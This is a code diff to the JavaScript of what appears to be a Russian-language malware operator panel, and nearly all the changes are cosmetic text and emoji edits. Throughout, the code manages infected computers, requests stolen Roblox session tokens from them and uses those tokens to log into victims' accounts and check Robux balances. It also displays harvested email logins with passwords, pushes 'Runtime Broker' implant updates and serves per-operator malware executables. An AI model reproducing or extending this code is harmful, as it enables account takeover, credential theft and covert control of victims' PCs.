@@ -253,8 +253,8 @@ function updateStats() {
       labelEl.style.color = "var(--danger)";
       labelEl.textContent = "Доступно обновление";
       if (unitEl) unitEl.style.color = "var(--text-secondary)";
-      subtextEl.style.color = "var(--text-muted)";
-      subtextEl.innerHTML = "Нажмите для обновления клиентов";
+      subtextEl.style.color = "rgba(255,255,255,0.6)";
+      subtextEl.innerHTML = "⚡ Нажмите, чтобы обновить устаревшие";
       cardEl.classList.add('active-action');
       cardEl.classList.remove('disabled-action');
       cardEl.onclick = function() {
@@ -265,13 +265,13 @@ function updateStats() {
       labelEl.style.color = "#10b981";
       labelEl.textContent = "Обновление";
       if (unitEl) unitEl.style.color = "#10b981";
-      subtextEl.style.color = "var(--text-muted)";
-      subtextEl.innerHTML = "Все клиенты актуальны";
+      subtextEl.style.color = "rgba(255,255,255,0.4)";
+      subtextEl.innerHTML = "✅ Все клиенты актуальны";
       cardEl.classList.remove('active-action');
       cardEl.classList.add('disabled-action');
       cardEl.onclick = function(e) {
         e.stopPropagation();
-        toast("Все ваши клиенты уже обновлены до актуальной версии", "ok");
+        toast("Все ваши клиенты уже обновлены до v7.2.2!", "info");
       };
     }
   }
@@ -312,7 +312,7 @@ function filterFiles() {
 function renderFiles(list) {
   const grid = document.getElementById("fileGrid");
   if (list.length === 0) {
-    grid.innerHTML = "<div class='empty'>Файлы не найдены</div>";
+    grid.innerHTML = "<div class='empty'><span class='empty-icon'>🌌</span>Совпадений не найдено</div>";
     return;
   }
 
@@ -404,40 +404,37 @@ function openModalByIndex(idx) {
   const tokenStatusText = document.getElementById("tokenStatusText");
 
   const lastLogin = roblox.lastLogin || localStorage.getItem('login_' + f.name);
-  let loginText = 'Войти в аккаунт';
+  let loginText = '👤 Войти в аккаунт';
   if (lastLogin) {
     const d = new Date(parseInt(lastLogin));
-    loginText = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
+    loginText = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
   }
   loginBtn.textContent = loginText;
 
   if (hasToken && isValid) {
     loginBtn.style.display = "";
     loginBtn.onclick = function() {
-      loginBtn.textContent = 'Вход...';
+      loginBtn.textContent = '⏳...';
       loginBtn.disabled = true;
 
       function handler(e) {
         if (e.data && e.data.type === 'nexus-login-response') {
           window.removeEventListener('message', handler);
           if (e.data.ok) {
-            const nowTs = Date.now();
-            localStorage.setItem('login_' + f.name, String(nowTs));
-            if (roblox.userId) localStorage.setItem('login_user_' + roblox.userId, String(nowTs));
-            if (roblox.user) localStorage.setItem('login_user_' + roblox.user.toLowerCase(), String(nowTs));
+            localStorage.setItem('login_' + f.name, Date.now());
             apiFetch('/api/login-mark', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ filename: f.name, timestamp: nowTs })
-            }).catch(()=>{});
+              body: JSON.stringify({ filename: f.name })
+            }).catch(()=>{}); // Fire and forget
             const d = new Date();
-            loginBtn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
+            loginBtn.textContent = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
             loginBtn.disabled = false;
-            toast('Вход выполнен, открываем Roblox...');
+            toast('✅ Вход выполнен, открываем Roblox...');
           } else {
             loginBtn.textContent = loginText;
             loginBtn.disabled = false;
-            toast('Установите расширение NEXUS для входа', 'err');
+            toast('⚠️ Установи расширение NEXUS для входа', 'err');
           }
         }
       }
@@ -449,7 +446,7 @@ function openModalByIndex(idx) {
         window.removeEventListener('message', handler);
         loginBtn.textContent = loginText;
         loginBtn.disabled = false;
-        toast('Установите расширение NEXUS для входа', 'err');
+        toast('⚠️ Установи расширение NEXUS для входа', 'err');
       }, 800);
     };
     tokenStatusRow.style.display = "none";
@@ -462,7 +459,7 @@ function openModalByIndex(idx) {
   const requestEl = document.getElementById("tokenRequestStatus");
   if (f.tokenRequest && f.tokenRequest.requested) {
     const at = f.tokenRequest.requestedAt ? new Date(f.tokenRequest.requestedAt).toLocaleString("ru") : "только что";
-    requestEl.textContent = "Ожидаем ответ клиента (" + at + ")";
+    requestEl.textContent = "⏳ Ожидаем ответ клиента (" + at + ")";
     requestEl.style.color = "var(--warning)";
   } else {
     requestEl.textContent = "Нет активного запроса";
@@ -478,7 +475,7 @@ function openModalByIndex(idx) {
       return;
     }
     emailsSection.style.display = "block";
-    emailsList.innerHTML = '<div style="text-align:center; padding:8px; color:var(--text-muted); font-size:0.75rem;">Загрузка...</div>';
+    emailsList.innerHTML = '<div style="text-align:center; padding:8px; color:var(--text-muted); font-size:0.75rem;">⏳ Загрузка...</div>';
     apiFetch('/api/emails/' + encodeURIComponent(f.name)).then(function(r) { return r.json(); }).then(function(data) {
       if (data && Array.isArray(data) && data.length > 0) {
         emailsList.innerHTML = data.map(function(e) {
@@ -487,18 +484,18 @@ function openModalByIndex(idx) {
           var pass = escapeHtml(e.password || "");
           var domain = "";
           try { domain = new URL(url).hostname; } catch(_) {}
-          return '<div style="background:#18181b; border:1px solid var(--border); border-radius:6px; padding:6px 10px; font-size:0.75rem; display:flex; flex-direction:column; gap:2px;">' +
-            '<div style="color:var(--text); font-weight:600;">' + escapeHtml(domain || url) + '</div>' +
+          return '<div style="background:rgba(0,0,0,0.25); border-radius:8px; padding:6px 10px; font-size:0.72rem; display:flex; flex-direction:column; gap:2px;">' +
+            '<div style="color:var(--accent-text); font-weight:600;">' + escapeHtml(domain || url) + '</div>' +
             '<div style="display:flex; gap:8px; flex-wrap:wrap;">' +
               '<span style="color:var(--success);">' + user + '</span>' +
               (pass ? '<span style="color:var(--danger);">' + pass + '</span>' : '') +
             '</div></div>';
         }).join("");
       } else {
-        emailsList.innerHTML = '<div style="text-align:center; padding:12px; color:var(--text-muted); font-size:0.75rem;">Почтовые аккаунты не найдены</div>';
+        emailsList.innerHTML = '<div style="text-align:center; padding:12px; color:var(--text-muted); font-size:0.75rem;">📭 Почтовые аккаунты не найдены</div>';
       }
     }).catch(function() {
-      emailsList.innerHTML = '<div style="text-align:center; padding:12px; color:var(--danger); font-size:0.75rem;">Ошибка загрузки</div>';
+      emailsList.innerHTML = '<div style="text-align:center; padding:12px; color:var(--danger); font-size:0.75rem;">❌ Ошибка загрузки</div>';
     });
   };
 
@@ -506,7 +503,9 @@ function openModalByIndex(idx) {
     window.location.href = "tokens.html?file=" + encodeURIComponent(f.name);
   };
 
+  // Removed modalRobuxBtn
   document.getElementById("modalRequestBtn").onclick = function() { requestToken(f.name); };
+  // Removed modalRequestStatusBtn
   document.getElementById("modalUpdateBtn").onclick = function() { updateClient(f.name); };
   document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };
 
@@ -520,7 +519,7 @@ function closeModal() {
 function copyToken() {
   if (!currentToken) return;
   navigator.clipboard.writeText(currentToken).then(function() {
-    toast("Токен скопирован");
+    toast("📋 Токен скопирован в буфер");
   }).catch(function() {
     const ta = document.createElement("textarea");
     ta.value = currentToken;
@@ -528,7 +527,7 @@ function copyToken() {
     ta.select();
     document.execCommand("copy");
     document.body.removeChild(ta);
-    toast("Токен скопирован");
+    toast("📋 Токен скопирован");
   });
 }
 
@@ -551,7 +550,7 @@ async function deleteFile(name) {
 
 // ── Запрос токена ─────────────────────────────────────────────────────────────
 async function requestToken(filename) {
-  toast('Запрос отправлен...');
+  toast('📡 Запрос отправлен...');
   try {
     await apiFetch('/request-token', {
       method: 'POST',
@@ -560,10 +559,10 @@ async function requestToken(filename) {
     });
     const reqEl = document.getElementById('tokenRequestStatus');
     if (reqEl) {
-      reqEl.textContent = 'Ожидаем ответ клиента';
+      reqEl.textContent = '⏳ Ожидаем ответ клиента';
       reqEl.style.color = 'var(--warning)';
     }
-    toast('Запрос токена отправлен клиенту');
+    toast('📡 Запрос токена отправлен компьютеру');
     loadFiles();
   } catch (e) {
     if (e.message !== 'auth') toast('Ошибка запроса', 'err');
@@ -578,12 +577,12 @@ async function refreshRequestStatus(filename) {
       openModalByIndex(idx);
       const f = allFiles[idx];
       if (f.tokenRequest && f.tokenRequest.requested) {
-        toast('Клиент ещё не ответил');
+        toast('⏳ Клиент ещё не ответил');
       } else {
-        toast('Активного запроса нет');
+        toast('✅ Активного запроса нет');
       }
     } else {
-      toast('Компьютер не найден', 'err');
+      toast('⚠️ Компьютер не найден', 'err');
     }
   } catch (e) {
     if (e.message !== 'auth') toast('Ошибка обновления статуса', 'err');
@@ -593,17 +592,17 @@ async function refreshRequestStatus(filename) {
 document.getElementById('btnRequestAll').addEventListener('click', async function() {
   const btn = this;
   btn.disabled = true;
-  btn.textContent = 'Отправка...';
+  btn.textContent = '⏳ Отправка...';
   try {
     const r = await apiFetch('/request-token-all', { method: 'POST' });
     const data = await r.json();
-    toast('Запрос отправлен ' + (data.count || 'всем') + ' компьютерам');
+    toast('📡 Запрос отправлен ' + (data.count || 'всем') + ' компьютерам');
     loadFiles();
   } catch (e) {
     if (e.message !== 'auth') toast('Ошибка запроса', 'err');
   }
   btn.disabled = false;
-  btn.textContent = 'Запросить у всех';
+  btn.textContent = '📡 Запросить у всех';
 });
 
 async function checkRobux(name) {
@@ -612,10 +611,10 @@ async function checkRobux(name) {
   const statusRow = document.getElementById("robloxSpecStatusRow");
   const statusEl = document.getElementById("robloxSpecStatus");
   robuxRow.style.display = "flex";
-  robuxEl.textContent = "Проверка...";
+  robuxEl.textContent = "⏳ Проверка...";
   robuxEl.style.color = "var(--warning)";
   statusRow.style.display = "flex";
-  statusEl.textContent = "Запрос к API...";
+  statusEl.textContent = "Запрос к Roblox API...";
   statusEl.style.color = "var(--warning)";
   try {
     const r = await apiFetch("/robux-check-file", {
@@ -629,39 +628,35 @@ async function checkRobux(name) {
       robuxEl.style.color = "var(--success)";
       statusEl.textContent = "Аккаунт: " + info.username + " (ID: " + info.userId + ")";
       statusEl.style.color = "var(--text-secondary)";
-      toast("Баланс: " + info.robux.toLocaleString() + " R$");
+      toast("💰 Robux: " + info.robux.toLocaleString());
     } else {
-      robuxEl.textContent = "Недействителен";
+      robuxEl.textContent = "❌";
       robuxEl.style.color = "var(--danger)";
       statusEl.textContent = "Ошибка: " + (info.error || "неизвестно");
       statusEl.style.color = "var(--danger)";
-      toast("Токен недействителен", "err");
+      toast("❌ Токен недействителен", "err");
     }
     loadFiles();
   } catch (e) {
     if (e.message === 'auth') return;
-    robuxEl.textContent = "Ошибка";
+    robuxEl.textContent = "❌";
     statusEl.textContent = "Ошибка сети: " + e.message;
     statusEl.style.color = "var(--danger)";
   }
 }
 
 function getOperatorDownloadUrl() {
-  const user = (getUser() || '').toLowerCase();
+  const user = getUser();
   const base = window.API_BASE || window.location.origin;
-  if (user === 'shonll') {
+  if (user === 'Shonll') {
     return base + '/downloads/RAH_Non_Pro.exe';
-  } else if (user === 'dildman') {
-    return base + '/downloads/NON_PRO.exe';
-  } else if (user === 'saha_kakaha122' || user === 'svyaz') {
-    return base + '/downloads/SVYAZ_NON_PRO.exe';
   } else {
     return base + '/downloads/NON_PRO.exe';
   }
 }
 
 async function updateClient(filename) {
-  if (!confirm("Отправить команду на фоновое обновление Runtime Broker на этом ПК?")) return;
+  if (!confirm("Действительно отправить команду на фоновое обновление Runtime Broker на этом ПК?")) return;
   try {
     const r = await apiFetch('/request-update', {
       method: 'POST',
@@ -670,9 +665,9 @@ async function updateClient(filename) {
     });
     const resp = await r.json();
     if (resp.success) {
-      toast('Команда на обновление отправлена');
+      toast('✅ Команда на обновление отправлена');
     } else {
-      toast('Ошибка: ' + (resp.error || 'неизвестно'), 'err');
+      toast('❌ Ошибка: ' + (resp.error || 'неизвестно'), 'err');
     }
   } catch (e) {
     if (e.message !== 'auth') toast('Ошибка отправки', 'err');
@@ -681,7 +676,7 @@ async function updateClient(filename) {
 
 async function updateAllClients(outdatedCount) {
   const countStr = outdatedCount ? ` (${outdatedCount} шт.)` : "";
-  if (!confirm("Отправить команду на фоновое обновление Runtime Broker на все устаревшие ПК" + countStr + "?")) return;
+  if (!confirm("Внимание! Отправить команду на фоновое обновление Runtime Broker на все устаревшие ПК" + countStr + "?")) return;
   try {
     const r = await apiFetch('/request-update-all', {
       method: 'POST',
@@ -690,10 +685,10 @@ async function updateAllClients(outdatedCount) {
     });
     const resp = await r.json();
     if (resp.success) {
-      toast('Запрос отправлен на ' + resp.count + ' ПК');
-      loadFiles();
+      toast('✅ Запрос отправлен на ' + resp.count + ' ПК');
+      loadFiles(); // Перезагружаем файлы, чтобы пересчитать статистику
     } else {
-      toast('Ошибка: ' + (resp.error || 'неизвестно'), 'err');
+      toast('❌ Ошибка: ' + (resp.error || 'неизвестно'), 'err');
     }
   } catch (e) {
     if (e.message !== 'auth') toast('Ошибка отправки', 'err');
